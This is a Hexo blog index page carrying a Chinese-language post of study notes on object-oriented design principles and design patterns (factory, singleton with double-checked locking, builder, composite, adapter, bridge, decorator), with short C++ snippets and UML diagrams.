<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/2/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/22/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/22/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">设计模式</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-22 13:09:00 / Modified: 13:18:44" itemprop="dateCreated datePublished" datetime="2025-04-22T13:09:00+08:00">2025-04-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="设计模式">设计模式</h1>
<p>https://github.com/DeutschBall/DesignModel</p>
<h2 id="六原则">六原则</h2>
<h3 id="单一职责原则">单一职责原则</h3>
<p>一个类负责的职责应该尽可能少，最好是单一功能。类应该只有一个引起自己变化的原因。</p>
<p>否则如果有两个以上功能，当用户只是用其中一个功能时还要导入其他无用功能</p>
<h3 id="开放封闭原则">✨开放封闭原则</h3>
<p>对拓展开放， 对修改关闭</p>
<p>已经写好的代码应该尽可能保持不变，新功能以拓展的形式实现，不应该以修改的形式出现</p>
<p>比如向有些if-else中添加判断条件就不满足改原则</p>
<h3 id="依赖倒置原则">依赖倒置原则</h3>
<p>针对接口编程, 不针对实现编程</p>
<p>变量的声明类型尽量是抽象类或接口，这样我们的变量引用和实际对象间，就存在一个缓冲层，利于程序扩展和优化。</p>
<h3 id="里氏替换原则">✨里氏替换原则</h3>
<p>一个软件实体如果使用的是一个父类的话，那么一定适用于其子类，而且它察觉不出父类对象和子类对象的区别。也就是说，在软件里面，把父类都替换成它的子类，程序的行为没有变化.</p>
<p>高层模块不能依赖底层模块, 高层模块和底层模块都应依赖抽象.</p>
<p>考虑这么一个问题: 鸟类能否作为企鹅类的父类?</p>
<p>鸟类必须实现fly接口, 如果企鹅类继承鸟类, 意思就是企鹅也有fly接口,
但是企鹅显然不会飞. 因此这继承就不对.</p>
<p>也就是说, 只有子类可以完全替代父类, 才能使用继承.</p>
<h3 id="迪米特法则">迪米特法则</h3>
<p>最少知识原则</p>
<p>1.最低访问权限</p>
<p>2.两个类彼此不通信则两个类不应当发生直接的相互作用</p>
<h3 id="合成聚合复用原则">✨✨✨合成/聚合复用原则</h3>
<p>优先使用对象的合成/聚合关系，而不是类继承关系</p>
<p>聚合（组合）：弱拥有关系，A对象中可以包含B对象，也可以不包含。A对象和B对象离开对方都能独立存在。
个体与群组。</p>
<p>合成：强拥有关系，严格的部分和整体关系，两者共存亡。 器官与身体</p>
<p>优点是类的继承层次比较小。保持每个类被单独封装，集中精力面对单个任务。</p>
<h2 id="uml类图">UML类图</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409093149630.png"
alt="image-20250409093149630" />
<figcaption aria-hidden="true">image-20250409093149630</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 7%" />
<col style="width: 53%" />
<col style="width: 39%" />
</colgroup>
<thead>
<tr>
<th>类关系</th>
<th>解释</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr>
<td>继承</td>
<td>继承一个父类</td>
<td>鸟类继承动物类</td>
</tr>
<tr>
<td>实现</td>
<td>实现一个接口</td>
<td>鸟类实现IFlyAble接口</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>依赖</td>
<td>类B作为类A方法的参数，在A中临时存在</td>
<td></td>
</tr>
<tr>
<td>关联</td>
<td>类B作为类A的成员变量，在A中永久存在</td>
<td>链表类中有一个附加头节点类的引用</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>聚合</td>
<td>个体可以离开整体存在</td>
<td></td>
</tr>
<tr>
<td>组合</td>
<td>个体和整体共存亡，不可分开</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="设计模式-1">设计模式</h2>
<h3 id="创建型模式">创建型模式</h3>
<p>创建对象同时隐藏创建逻辑，避免直接使用new运算符</p>
<h4 id="工厂模式">工厂模式</h4>
<h5 id="简单工厂模式">简单工厂模式</h5>
<p>简单工厂方法的弊端：违反了开放-封闭原则</p>
<p>简单工厂类需要接受一个类型参数，然后通过switch-case判断返回具体对象</p>
<p>如果要加入新的类型，那么就得改写这个switch-case逻辑，这就违反了开放-封闭原则</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> CashSuper* <span class="title function_">createCash</span><span class="params">(<span class="type">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; type)</span>&#123;</span><br><span class="line">    CashSuper * cash = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(type==<span class="string">&quot;正常收费&quot;</span>)&#123;</span><br><span class="line">        cash = new CashNormal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;8折收费&quot;</span>)&#123;</span><br><span class="line">        cash = new CashDiscount(<span class="number">0.8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(type == <span class="string">&quot;满20减5&quot;</span>)&#123;</span><br><span class="line">        cash = new CashReturn(<span class="number">20</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cash = new CashNormal();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="工厂方法模式">工厂方法模式</h5>
<p>工厂方法模式是对简单工厂模式的改进，需要满足开放-封闭原则</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409164116644.png"
alt="image-20250409164116644" />
<figcaption aria-hidden="true">image-20250409164116644</figcaption>
</figure>
<h4 id="抽象工厂模式">抽象工厂模式</h4>
<p>适用场景:</p>
<p>考虑这么一种场景</p>
<p>有两家工厂, 苹果工厂和联想工厂</p>
<p>两家工厂都生产计算机, 智能手机等电子产品</p>
<p>用户想要一款苹果手机</p>
<p>就是有多种品牌系统(在这里是联想和苹果),他们都能生产同种类的产品</p>
<p>此时就可使用抽象工厂模式</p>
<p>抽象工厂模式的实现流程:</p>
<p>1.定义抽象产品类, 在本例中是智能手机和计算机基类.
可以规定产品通用的功能接口, 比如手机可以打电话</p>
<p>2.定义具体产品类, 在本例中是苹果手机,苹果电脑, 联想手机,联想电脑</p>
<p>3.定义抽象工厂类, 规定任意工厂都能生产的产品类型,
在本例中是计算机和智能手机.</p>
<p>4.定义具体工厂类, 具体工厂类实现抽象工厂.
在本例中具体工厂就是苹果工厂和联想工厂.</p>
<p>具体工厂中生产具体产品, 实际上是实现抽象工厂规定的生产接口</p>
<p>抽象工厂规定要生产智能手机</p>
<p>苹果工厂中实现生产苹果手机</p>
<h4 id="单例模式">单例模式</h4>
<p>保证一个类只有一个实例, 并提供一个全局访问点</p>
<p>懒汉模式: 在第一次使用单例时才创建它</p>
<p>饿汉模式: 在main函数之前, 也就是程序初始化时创建它</p>
<p>在多线程环境下, 懒汉模式会面临线程安全问题, 但是饿汉不会</p>
<p>因为饿汉创建单例是在main函数之前, 此时绝对不会有多个线程</p>
<p>但是懒汉模式下两个线程可能同时创建单例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SingletonLazy&amp; <span class="title function_">getSingletonLazy</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//进入临界区,可能会有两个线程都判断instance为空然后进来创建对象</span></span><br><span class="line">        instance = new SingletonLazy();	</span><br><span class="line">        <span class="comment">//退出临界区</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="懒汉模式下的线程安全问题">懒汉模式下的线程安全问题</h5>
<p>可以使用双重锁解决这个问题</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> SingletonLazy&amp; <span class="title">getSingletonLazy</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        m.<span class="built_in">lock</span>();		<span class="comment">//static mutex m也是本类唯一的互斥锁</span></span><br><span class="line">        <span class="keyword">if</span>(instance==<span class="literal">NULL</span>)&#123;	<span class="comment">//再次判断是否已经创建了对象</span></span><br><span class="line">        	instance = <span class="keyword">new</span> <span class="built_in">SingletonLazy</span>();	</span><br><span class="line">    	&#125;</span><br><span class="line">        m.<span class="built_in">unlock</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>两次判空的作用是?</p>
<p>加锁和上锁操作开销比较大, 应该尽量避免</p>
<p>假设有两个线程A,B同时通过了第一次判空</p>
<p>A线程首先持有m锁, 并通过了第二次判空, 创建了对象</p>
<p>B线程等A释放m锁后再持有, 此时B判空发现对象已经创建好了,
自己就不用再创建了</p>
<p>如果去掉外层判空, 依然是线程安全, 但是这样会导致, 不管对象是否被创建,
每个线程来了都先等锁, 即使不需要创建对象, 也要无意义等锁</p>
<p>如果去掉内层判空, 就不是线程安全的了,
考虑上述AB两个线程都经过了外层判空, A首先持有锁创建对象, 然后B持有锁看,
B都不看是否有对象了就创建.还是会造成线程安全问题</p>
<h5 id="静态局部变量的线程安全性">静态局部变量的线程安全性</h5>
<p>c++11之后静态局部变量的初始化是线程安全的</p>
<p>因此懒汉模式直接这样写, 也是线程安全的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SingletonLazy&amp; <span class="title function_">getSingletonLazy</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">static</span> SingletonLazy instance;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现原理:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004012cf &lt;+23&gt;:    lea    rax,[rip+0x2ed2]        # 0x4041a8 &lt;_ZGVZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x00000000004012d6 &lt;+30&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000004012d9 &lt;+33&gt;:    call   0x4010b0 &lt;__cxa_guard_acquire@plt&gt;</span><br><span class="line">0x00000000004012de &lt;+38&gt;:    test   eax,eax</span><br><span class="line">0x00000000004012e0 &lt;+40&gt;:    setne  al</span><br><span class="line">0x00000000004012e3 &lt;+43&gt;:    test   al,al</span><br><span class="line">0x00000000004012e5 &lt;+45&gt;:    je     0x40130b &lt;_ZN13SingletonLazy16getSingletonLazyEv+83&gt;</span><br><span class="line">0x00000000004012e7 &lt;+47&gt;:    mov    r12d,0x0</span><br><span class="line">0x00000000004012ed &lt;+53&gt;:    lea    rax,[rip+0x2eac]        # 0x4041a0 &lt;_ZZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x00000000004012f4 &lt;+60&gt;:    mov    rdi,rax</span><br><span class="line">0x00000000004012f7 &lt;+63&gt;:    call   0x40127e &lt;_ZN13SingletonLazyC2Ev&gt;</span><br><span class="line">0x00000000004012fc &lt;+68&gt;:    lea    rax,[rip+0x2ea5]        # 0x4041a8 &lt;_ZGVZN13SingletonLazy16getSingletonLazyEvE8instance&gt;</span><br><span class="line">0x0000000000401303 &lt;+75&gt;:    mov    rdi,rax</span><br><span class="line">0x0000000000401306 &lt;+78&gt;:    call   0x401040 &lt;__cxa_guard_release@plt&gt;</span><br></pre></td></tr></table></figure>
<p>在第11行调用构造函数的前后, 编译器自动加上了<code>guard</code></p>
<p><code>guard</code>底层由<code>SYS_futex</code>系统调用实现</p>
<h4 id="建造者模式">✨建造者模式</h4>
<p>设计n个类表现汽车:</p>
<ol type="1">
<li>所有汽车都具备"行驶"的功能</li>
<li>汽车的"车门数量"可能不同</li>
<li>汽车按照能源类型分为"燃油车"和"电动车"，燃油车具备"加油"的能力，电动车具备"充电"的能力</li>
<li>汽车按照用途分为"轿车"和"卡车"，轿车没有额外功能，卡车具备"装载货物"的功能最终一辆4门电动卡车是如何表达的</li>
</ol>
<h5 id="车的组成---桥接模式">车的组成 - 桥接模式</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410195428877.png"
alt="image-20250410195428877" />
<figcaption aria-hidden="true">image-20250410195428877</figcaption>
</figure>
<p>所有车辆共有的车门, 引擎, 能源等组件, 均以槽位的形式虚位以待 ,
也就是车与这几个组件都是组合关系</p>
<p>车相关的类按照用途划分为卡车类和轿车类,
其中卡车类多一个<code>loaders</code>槽, 用于组合集装箱类</p>
<h5 id="车的生产---建造者模式">车的生产 - 建造者模式</h5>
<p>用户实际上不关心车辆的构造,
用户只需要关心<code>charge</code>充能和<code>run</code>耗能行驶就够了</p>
<p>用户只需要提出需求“四门电动卡车”, 然后等着提货就完了</p>
<p>对于每种用户需求,
可以建立一个专门的<code>Builder</code>来满足需求</p>
<p>比如<code>ElectricTruckBuilder</code></p>
<p><code>Builder</code>也可以有类体系:</p>
<p><code>AutoBuilder</code>表示所有车辆通用的建造者,
用于组装车辆共有部分比如门</p>
<p><code>TruckBuilder</code>表示卡车类建造者, 用于组装集装箱</p>
<p><code>ElectricTruckBuilder</code>表示电卡车,
在卡车基础上组装电动力</p>
<p>只有具体的建造者类才能实例化, 任何父类都含有抽象方法,
有抽象函数未实现的类实例化无法通过编译.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410202039417.png"
alt="image-20250410202039417" />
<figcaption aria-hidden="true">image-20250410202039417</figcaption>
</figure>
<p>所有建造者应该由一个指导者管理, 决定到底采用哪个构造者,</p>
<p>用户只需要跟指导者说自己想要什么样的车, 指导者去找对应的建造者</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410202558152.png"
alt="image-20250410202558152" />
<figcaption aria-hidden="true">image-20250410202558152</figcaption>
</figure>
<h4 id="原型模式">原型模式</h4>
<p>通过一份原型，克隆出多个副本</p>
<p>比如简历，可以打印一份，复印多份</p>
<p>就是继承一个Cloneable接口，实现一个clone函数</p>
<p>根据需要实现深拷贝和浅拷贝</p>
<h3 id="结构型模式">结构型模式</h3>
<p>关注对象之间的组合和关系， 构建灵活且可复用的类和对象结构</p>
<h4 id="组合模式">组合模式</h4>
<p>用树形结构管理系统</p>
<p>用户对父节点的操作和对子节点的操作具有一致性</p>
<blockquote>
<p>以语法分析树为例, 各个节点均实现visit接口</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416180301701.png"
alt="image-20250416180300050" />
<figcaption aria-hidden="true">image-20250416180300050</figcaption>
</figure>
<p>Operand就是叶子类</p>
<p>Operator就是内部节点类</p>
<p>这样将内部节点和叶子节点分类讨论, 是<strong>安全模式</strong></p>
<p>如果将叶子节点也归为内部节点, 不再分类讨论,
则变成了<strong>透明模式</strong>,
此时实际上的叶子节点的handle和getBase等函数没有意义</p>
</blockquote>
<p>问题场景:</p>
<p>描述如下公司结构</p>
<p>总部有自己的人力和财务, 总部还管理多个分公司</p>
<p>分公司也有自己的人力和财务,分公司管理多个办事处</p>
<p>办事处也有自己的人力和财务</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416170147209.png"
alt="image-20250416170042003" />
<figcaption aria-hidden="true">image-20250416170042003</figcaption>
</figure>
<h5 id="透明模式">透明模式</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250418165848591.png"
alt="image-20250416185347833" />
<figcaption aria-hidden="true">image-20250416185347833</figcaption>
</figure>
<p>这样实现的不足之处是, 人力, 财政等部门, 没有子部门或者子公司,</p>
<p><code>departments</code>成员和<code>addDepartment</code>方法不应该被继承.
违反了里氏替换原则</p>
<h5 id="安全模式">安全模式</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416191542638.png"
alt="image-20250416191540906" />
<figcaption aria-hidden="true">image-20250416191540906</figcaption>
</figure>
<h4 id="适配器模式">适配器模式</h4>
<p>将一个类的接口按需求转换为另一个类的接口</p>
<p>电源适配器:不管入户电压多少伏都转换为需要的电压比如36v</p>
<p>deque改成queue</p>
<p>vector改成stack</p>
<p>用户需求的接口以Target接口给出</p>
<p>Adapter类实现Target接口</p>
<p>Adapter类内部封装一个Adaptee类</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412230048356.png"
alt="image-20250412230046970" />
<figcaption aria-hidden="true">image-20250412230046970</figcaption>
</figure>
<h4 id="桥接模式">✨桥接模式</h4>
<p>本节最初描述了这么一件事情：</p>
<p>1.不同品牌的手机</p>
<p>2.每种手机都有mp3，游戏，通讯录等等功能</p>
<p>最初的设计方式是纯使用继承实现</p>
<p>有两种继承设计方案， 一个是品牌在高层，一个是功能在高层</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418145111883.png"
alt="image-20250418145111883" />
<figcaption aria-hidden="true">image-20250418145111883</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418145117103.png"
alt="image-20250418145117103" />
<figcaption aria-hidden="true">image-20250418145117103</figcaption>
</figure>
<p>但是这样设计就会面临一个问题：</p>
<p>当有新品牌手机出现， 或者新手机功能出现时，
会导致类的数量急剧膨胀</p>
<blockquote>
<p>书上是这样说的:</p>
<p>“是呀，就像我刚开始学会用面向对象的继承时，感觉它既新颖又功能强大，所以只要可以用，就都用上继承。这就好比是‘有了新锤子，所有的东西看上去都成了钉子。”</p>
</blockquote>
<p>这说的太对了。</p>
<p>然而仔细考虑这种继承关系的缺点：</p>
<p>编译时就确定了子类和父类的继承关系，导致子类和父类必然有紧密的依赖关系，父类的改动必然导致子类的改动。</p>
<p><strong>因此设计模式中的另一条设计原则：合成/聚合复用原则</strong></p>
<p><strong>仔细考虑还违反了单一职责原则，通过继承增加的新功能，就是在增加类的职责。</strong></p>
<p><strong>因此这个情景应该用聚合解决</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418150949353.png"
alt="image-20250418150949353" />
<figcaption aria-hidden="true">image-20250418150949353</figcaption>
</figure>
<p>手机是主体， 不管什么品牌， 都可以安装不同的软件，
软件可以视为主体上的空槽，可以任意安装</p>
<blockquote>
<p>考虑四门电动卡车问题时，实际上也是这个情况</p>
<p>按照能源继承后按照用途继承或者按照用途继承后按照能源继承，都是滥用继承设计</p>
<p>应该将车看成主体，将动力系统，运载系统等等看成槽位。空槽可以自定义添加模块.</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410195428877.png"
alt="桥接模式指导的车辆设计" />
<figcaption aria-hidden="true">桥接模式指导的车辆设计</figcaption>
</figure>
<p>这里Auto表示汽车类， Car和Truck表示汽车品牌</p>
<p>将Door，Engine，Container等等视为汽车的配件槽</p>
</blockquote>
<p><strong>实现系统可能有多角度分类，每一种分</strong></p>
<p><strong>类都有可能变化，那么就把这种多角度分离出来让它们独立变化，</strong></p>
<p><strong>减少它们之间的耦合</strong></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/85ad1d5793224b6b0f9e0c73527d93db.png"
alt="桥接模式" />
<figcaption aria-hidden="true">桥接模式</figcaption>
</figure>
<h4 id="装饰模式---咖啡点单">装饰模式 - 咖啡点单</h4>
<p>考虑如下场景:</p>
<p>形象设计, 人有多种衣服可以穿, 可以只穿一条裤衩子, 也可以穿地全副武装,
也可以裤衩子外穿装超人.</p>
<p>最初我的设计是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Wear&#123;&#125;;</span><br><span class="line">class UpWear : Wear&#123;&#125;;</span><br><span class="line">class UnderWear: Wear&#123;&#125;;</span><br><span class="line">class FootWear: Wear&#123;&#125;;</span><br><span class="line">class Avator&#123;</span><br><span class="line">	UpWear * upwear;</span><br><span class="line">	UnderWear * underwear;</span><br><span class="line">	FootWear * footwear;</span><br><span class="line">	void setUpWear(UpWear *up);</span><br><span class="line">	void setDownWear(DownWear *downwear);</span><br><span class="line">	void setFootWear(FootWear *footwear);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而这样设计的问题是:</p>
<p>1.人不一定只穿一件上衣, 可能穿了秋衣然后又穿了外套,
甚至可以不穿上衣</p>
<p>2.没法体现穿衣服的先后顺序</p>
<p>3.假设现在有一种新的装饰, 戒指Ring类, 那么Avator类无法表示</p>
<p>也就是说, 我们不能预估人会穿多少装饰物, 可能一件不穿,
可能穿的雍容华贵</p>
<p>我们不能站在人自己的角度来聚合装扮</p>
<p>应该站在装扮的角度往一个木偶身上套娃</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(木偶)</span><br><span class="line">((木偶),内裤)</span><br><span class="line">(((木偶),内裤),帆布鞋)</span><br><span class="line">((((木偶),内裤),帆布鞋),牛仔裤)</span><br></pre></td></tr></table></figure>
